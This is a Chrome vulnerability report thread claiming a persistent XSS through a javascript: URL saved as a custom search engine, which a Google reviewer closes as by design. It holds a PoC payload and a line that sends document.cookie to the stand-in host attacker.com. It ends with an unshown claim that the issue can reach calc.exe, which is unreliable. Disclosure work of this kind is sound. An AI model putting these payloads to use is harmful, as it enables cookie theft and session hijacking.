@@ -1,0 +1,114 @@
+Issue ID: 407533510
+
+Author: bu...@google.com
+<hr>
+<h3>Report description</h3>
+<p>Persistent XSS via Custom Search Engine Injection in Google Chrome (chrome://settings/searchEngines)</p>
+<hr>
+<h3>Bug location</h3>
+<h4>Where do you want to report your vulnerability?</h4>
+<p>Chrome VRP – Report security issues affecting the Chrome browser. <a href="https://bughunters.google.com/about/rules/5745167867576320/chrome-vulnerability-reward-program-rules" data-b-widget="url" data-b-original-href="https://bughunters.google.com/about/rules/5745167867576320/chrome-vulnerability-reward-program-rules" data-b-redirected-href="https://www.google.com/url?q=https://bughunters.google.com/about/rules/5745167867576320/chrome-vulnerability-reward-program-rules&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw31QXnMd5mgu42yXMeOAv3K">See program rules</a></p>
+<h4>Which URL (or repository) have you found the vulnerability in?</h4>
+<p>chrome://settings/searchEngines</p>
+<hr>
+<h3>The problem</h3>
+<h4>Please describe the technical details of the vulnerability</h4>
+<p>A persistent client-side XSS vulnerability exists in Google Chrome via the Custom Search Engine configuration. By registering a search engine using a javascript: URL as a search template, an attacker can trigger JavaScript execution within the browser context when the user:</p>
+<p>Uses the default search engine,</p>
+<p>Navigates to any page with an input box (e.g., <a href="http://www.google.com" data-b-widget="url" data-b-original-href="http://www.google.com" data-b-redirected-href="https://www.google.com/url?q=http://www.google.com&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw0x0NQRpl8cQqw-KhvGZyM_">www.google.com</a>, <a href="http://www.bing.com" data-b-widget="url" data-b-original-href="http://www.bing.com" data-b-redirected-href="https://www.google.com/url?q=http://www.bing.com&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw16-CZCZsHXQqyUw7AWEBcr">www.bing.com</a>, or any other domain),</p>
+<p>Or interacts with address bar search functionality.</p>
+<p>This XSS is persistent because it is saved within chrome://settings/searchEngines, and will trigger even after browser restarts, without requiring any user interaction beyond normal navigation.</p>
+<p>Steps to Reproduce (PoC):</p>
+<p>1--Visit:
+chrome://settings/searchEngines</p>
+<p>2--Add a new search engine:</p>
+<p>Name: test</p>
+<p>Shortcut: test</p>
+<p>URL with %s:
+javascript:alert(document.cookie)//%s</p>
+<p>3--Save</p>
+<p>Set the newly created search engine as default.</p>
+<p>Open a new tab and navigate to:
+<a href="https://www.google.com/" data-b-widget="url" data-b-original-href="https://www.google.com/" data-b-redirected-href="https://www.google.com/url?q=https://www.google.com/&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw127wd61nzw0rURYovy_xbs">https://www.google.com/</a></p>
+<p>now over this tab writte something
+you will see triggred xss with cookies</p>
+<h4>Impact analysis – Please briefly explain who can exploit the vulnerability, and what they gain when doing so</h4>
+<p>An attacker can exploit this issue to establish a persistent XSS in the victim&#39;s browser by tricking them into installing a custom search engine via:</p>
+<p>A malicious extension that automatically adds the custom search engine.</p>
+<p>A social engineering page that instructs the user to manually add the search engine (looks harmless).</p>
+<p>A pre-installed configuration in compromised environments (schools, companies, cybercafes, malware).</p>
+<p>Once the attacker sets up the custom search engine with:
+javascript:fetch(&#39;<a href="javascript:void(0);" data-b-widget="url" data-b-original-href="https://attacker.com/log?cookie=&#39;+document.cookie)//%s" data-b-redirected-href="https://www.google.com/url?q=https://attacker.com/log?cookie%3D&#39;%2Bdocument.cookie)//%25s&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw0ea-kakm9DpGYJC7pvH9T0">https://attacker.com/log?cookie=&#39;+document.cookie)//%s</a></p>
+<p>And makes it the default, the XSS will:</p>
+<p>persist even after browser restarts.</p>
+<p>trigger automatically when the user navigates to search-related or address bar related domains like:</p>
+<p>bing.com</p>
+<p>google.com</p>
+<p>yahoo.com</p>
+<p>or any other site where Chrome suggests the default search engine.</p>
+<p>Every time the victim:</p>
+<p>Uses the omnibox,</p>
+<p>Visits legitimate search engines,</p>
+<p>Or types anything without even searching,</p>
+<p>the JavaScript payload will execute persistently, allowing:</p>
+<p>Cookie theft</p>
+<p>Session hijacking</p>
+<p>Account takeover</p>
+<p>Forced redirects</p>
+<p>Further exploitation</p>
+<hr>
+<h3>The cause</h3>
+<h4>What version of Chrome have you found the security issue in?</h4>
+<p>134.0.6998.178 (Official Build) (64-bit) (cohort: Stable)</p>
+<h4>Is the security issue related to a crash?</h4>
+<p>No, it is not related to a crash.</p>
+<h4>Choose the type of vulnerability</h4>
+<p>Cross-site scripting (XSS)</p>
+<h4>How would you like to be publicly acknowledged for your report?</h4>
+<p>Salah Eddine Louffidi</p>
+
+Author: bu...@google.com
+google_domain
+
+Author: sa...@gmail.com
+Persistent XSS via Custom Search Engine Injection in Google Chrome (chrome://settings/searchEngines)
+
+Author: sa...@gmail.com
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: sa...@gmail.com
+public_non_google
+
+Author: se...@chromium.org
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: se...@chromium.org
+public_non_google
+
+Author: sa...@gmail.com
+TlRaaE5tVTRNREk0WXpCbFpEWTJaamM1WVRSak56VmtNalZpWVdGaE56WT0=
+
+Author: ch...@google.com
+type.googleapis.com/google.protobuf.Int64Value
+
+Author: ch...@google.com
+google_domain
+
+Author: za...@google.com
+<p>Thanks for reporting. This works as intended (by design) because the feature allows users to define arbitrary URLs, including javascript URLs. I am closing this as wont fix.</p>
+
+Author: za...@google.com
+googlers_unrestricted
+
+Author: za...@google.com
+type.googleapis.com/google.protobuf.Int32Value
+
+Author: sa...@gmail.com
+<p>bro this can be transformed to RCE if you make file:///C:/Windows/System32/calc.%s</p>
+<p>and after type exe in the barre you will display calc.exe</p>
+
+Author: ch...@google.com
+<p>This bug has been closed for more than 14 weeks. Removing issue access restrictions.</p>
+
+Author: ch...@google.com
+type.googleapis.com/google.devtools.issuetracker.v1.IssueAccessLimit
